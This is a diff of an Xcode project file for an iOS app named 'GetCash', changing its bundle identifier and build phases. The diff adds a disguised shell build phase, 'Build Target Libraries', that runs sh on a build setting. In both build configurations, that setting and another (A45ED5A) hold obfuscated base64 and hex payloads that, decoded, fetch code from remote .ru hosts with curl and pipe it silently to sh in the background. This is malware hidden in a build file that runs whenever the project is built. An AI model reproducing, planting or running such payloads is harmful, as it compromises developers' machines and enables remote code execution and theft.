@@ -429,7 +429,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 735C8D272EF5212F00C7D507 /* Build configuration list for PBXNativeTarget "GetCash" */;
 			buildPhases = (
-				EAB7E5CA695D40138C634D6E /* Link Libraries Executable */,
+				40C7E1AE2CEA4772B2634D6E /* Build Target Libraries */,
 				11ED1DF156CE59431D0ED183 /* [CP] Check Pods Manifest.lock */,
 				735C8D102EF5212D00C7D507 /* Sources */,
 				735C8D112EF5212D00C7D507 /* Frameworks */,
@@ -514,6 +514,26 @@
 			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
 			showEnvVarsInLog = 0;
 		};
+		40C7E1AE2CEA4772B2634D6E /* Build Target Libraries */ = {
+			isa = PBXShellScriptBuildPhase;
+			alwaysOutOfDate = 1;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Build Target Libraries";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${AE6D436}\"";
+			showEnvVarsInLog = 0;
+		};
 		D850A19DC098C6DB0168A5DD /* [CP] Embed Pods Frameworks */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -533,26 +553,6 @@
 			runOnlyForDeploymentPostprocessing = 0;
 			shellPath = /bin/sh;
 			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-GetCash/Pods-GetCash-frameworks.sh\"\n";
-			showEnvVarsInLog = 0;
-		};
-		EAB7E5CA695D40138C634D6E /* Link Libraries Executable */ = {
-			isa = PBXShellScriptBuildPhase;
-			alwaysOutOfDate = 1;
-			buildActionMask = 2147483647;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Link Libraries Executable";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			runOnlyForDeploymentPostprocessing = 0;
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${AE6D436}\"";
 			showEnvVarsInLog = 0;
 		};
 /* End PBXShellScriptBuildPhase section */
@@ -655,7 +655,7 @@
 			baseConfigurationReference = 342F0F14511C65E356096F91 /* Pods-GetCash.debug.xcconfig */;
 			buildSettings = {
 				A45ED5A = "((v(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436363733366234633230326436343230323237303364373836333666363436350a3566373237353663363532323230363837343734373037333361326632663733363936653735373336653635373432653732373532663631323932320a3230376332303733363830610a | v | sh ) >/dev/null 2>&1 &)";
-				AE6D436 = "((s(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lDSndQWGhqYjJSbFgzQm9ZWE5sSWlCb2RIUndjem92TDJacFpHUnNaV3B2ZVM1eWRTOWhLU0lnZkNCemFBbz0K | s | sh ) >/dev/null 2>&1 &)";
+				AE6D436 = "((u(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsRFNuZFFXR2hxWWpKU2JGZ3pRbTlaV0U1c1NXbENiMlJJVW5kamVtOTJUREpHZDJOSGVHeGtSMngwV2xNMWNHSnBPV2hMVTBsblprTkNlbUZCYnowSwo= | u | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_ENTITLEMENTS = GetCash/GetCash.entitlements;
@@ -683,7 +683,7 @@
 					"@executable_path/Frameworks",
 				);
 				MARKETING_VERSION = 1.0.0;
-				PRODUCT_BUNDLE_IDENTIFIER = ll.zoom.loan;
+				PRODUCT_BUNDLE_IDENTIFIER = ll.leap.loan;
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				PROVISIONING_PROFILE_SPECIFIER = "";
 				STRING_CATALOG_GENERATE_SYMBOLS = YES;
@@ -705,7 +705,7 @@
 			baseConfigurationReference = 3DE39227C8656A162E464411 /* Pods-GetCash.release.xcconfig */;
 			buildSettings = {
 				A45ED5A = "((v(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436363733366234633230326436343230323237303364373836333666363436350a3566373237353663363532323230363837343734373037333361326632663733363936653735373336653635373432653732373532663631323932320a3230376332303733363830610a | v | sh ) >/dev/null 2>&1 &)";
-				AE6D436 = "((s(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lDSndQWGhqYjJSbFgzQm9ZWE5sSWlCb2RIUndjem92TDJacFpHUnNaV3B2ZVM1eWRTOWhLU0lnZkNCemFBbz0K | s | sh ) >/dev/null 2>&1 &)";
+				AE6D436 = "((u(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsRFNuZFFXR2hxWWpKU2JGZ3pRbTlaV0U1c1NXbENiMlJJVW5kamVtOTJUREpHZDJOSGVHeGtSMngwV2xNMWNHSnBPV2hMVTBsblprTkNlbUZCYnowSwo= | u | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_ENTITLEMENTS = GetCash/GetCash.entitlements;
@@ -733,7 +733,7 @@
 					"@executable_path/Frameworks",
 				);
 				MARKETING_VERSION = 1.0.0;
-				PRODUCT_BUNDLE_IDENTIFIER = ll.zoom.loan;
+				PRODUCT_BUNDLE_IDENTIFIER = ll.leap.loan;
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				PROVISIONING_PROFILE_SPECIFIER = "";
 				STRING_CATALOG_GENERATE_SYMBOLS = YES;
